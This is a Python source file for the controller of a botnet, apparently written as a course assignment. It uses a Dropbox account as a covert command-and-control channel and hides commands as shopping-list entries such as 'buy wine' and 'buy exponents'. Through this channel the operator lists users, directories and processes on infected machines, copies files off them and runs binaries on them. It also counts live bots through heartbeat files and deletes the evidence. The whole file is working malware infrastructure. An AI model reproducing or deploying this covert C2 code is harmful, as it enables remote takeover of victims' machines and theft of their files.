#
# Author: Adam Novak
#
# Plagiarism is a sin!
# Plagiarism is a sin!
# Plagiarism is a sin!
#

import os
import sys
from Connection import Connection
import threading
import time
import translations


def heartbeat(period, connection, shopping_list, negative_counter):

    # counter
    local_counter = negative_counter

    # send periodical heart beats
    while True:

        is_ok = True
        local_counter -= 1

        # send ALIVE command
        if not connection.append_to_file(shopping_list, "on " + str(local_counter) + " day buy alive cat\n"):
            is_ok = False
            print("\033[41m(could not sent heartbeat)\033[0m", end='')

        # wait
        time.sleep(period + 10)

        # count bots
        if is_ok:
            no_bots = 0
            start_path = "/what_i_bought_on_day_" + str(local_counter)
            files = connection.list_files("")
            for f in files:
                path = str(f.path_display)
                if path.startswith(start_path):
                    no_bots += 1
                    connection.delete_file(f.path_display)
            print("\033[42m(", no_bots, "bots here)\033[0m", end='')


def main():

    # get args
    argc = len(sys.argv)
    argv = sys.argv

    # check number of arguments
    if argc != 3:
        exit("python3 controller.py <API KEY> <INTERVAL>")

    # programmer friendly naming
    api_key = argv[1]
    interval = int(argv[2])
    shopping_list = "/shopping_list.txt"

    # create connection
    conn = Connection(api_key)

    # check connection
    if not conn.is_connected():
        exit("Could not to connect to Dropbox!")

    # counters
    negative_counter = 0
    positive_counter = 0

    # create shopping list
    if not conn.exist_file(shopping_list):
        if not conn.create_file(shopping_list):
            exit("Could not create shopping list!")
    # get counters from existing list
    else:
        data = conn.get_file_content(shopping_list).decode('utf-8').split('\n')
        for row in data:
            if len(row) > 0:
                c = int(row.split()[1])
                if c < 0:
                    negative_counter = min(negative_counter, c)
                else:
                    positive_counter = max(positive_counter, c)

    # introduction
    print("   ___     ___   __   __")
    print("  | _ )   / __|  \ \ / /")
    print("  | _ \   \__ \   \ V / ")
    print("  |___/   |___/    |_|  ")
    print("")
    print("Supported commands:")
    print("w               list of users currently logged in")
    print("ls <PATH>       list content of specified directory")
    print("id              ID of current user")
    print("ps              lists processes on the target machine")
    print("copy <PATH>     copy a file from the bot to the controller")
    print("exec <PATH>     execute a binary inside the bot given the path of the binary")
    print("end             turn off bots and controller")
    print("")

    # start heartbeat
    heartbeat_thread = threading.Thread(target=heartbeat, args=(interval, conn, shopping_list, negative_counter))
    heartbeat_thread.start()

    # counter for commands
    counter = positive_counter

    # send commands
    while True:

        counter += 1

        # read command
        command = input("What is you command: ").split()

        # command w
        if len(command) == 1 and command[0] == "w":
            encrypted_command = "on " + str(counter) + " day buy wine\n"
        # command ls
        elif len(command) == 2 and command[0] == "ls":
            enc = translations.encode_string(command[1])
            encrypted_command = "on " + str(counter) + " day buy list !A!N!D! " + enc + "\n"
        # command id
        elif len(command) == 1 and command[0] == "id":
            encrypted_command = "on " + str(counter) + " day buy identity\n"
            # command id
        elif len(command) == 1 and command[0] == "ps":
            encrypted_command = "on " + str(counter) + " day buy playstation\n"
        # command copy
        elif len(command) == 2 and command[0] == "copy":
            enc = translations.encode_string(command[1])
            encrypted_command = "on " + str(counter) + " day buy copy machine !A!N!D! " + enc + "\n"
        # command w
        elif len(command) == 2 and command[0] == "exec":
            enc = translations.encode_string(command[1])
            encrypted_command = "on " + str(counter) + " day buy exponents !A!N!D! " + enc + "\n"
        elif len(command) == 1 and command[0] == "end":
            encrypted_command = "on " + str(counter) + " day buy happy end\n"
        # empty command
        elif len(command) == 0:
            continue
        # unknown
        else:
            print("Unknown command. Try it again.\n")
            continue

        # try to send command
        if not conn.append_to_file(shopping_list, encrypted_command):
            print("Could not write command. Try it again.\n")
            continue

        # end command
        if command[0] == "end":
            print("Good bye")
            os._exit(0)

        # wait
        print("Waiting for bots. Interval is", interval, "+ 10 seconds\n")
        time.sleep(interval + 10)

        print("The response is:\n")
        start_path = "/what_i_bought_on_day_" + str(counter)

        files = conn.list_files("")
        for f in files:
            path = str(f.path_display)
            if path.startswith(start_path):
                content = conn.get_file_content(path)
                print(f"\033[93m")
                print("Bot", path[len(start_path) + 1:].split('.')[0], "\n")
                print(translations.decode_string(content.decode("utf-8")))
                print("\033[0m")
                conn.delete_file(f.path_display)


if __name__ == "__main__":
    main()



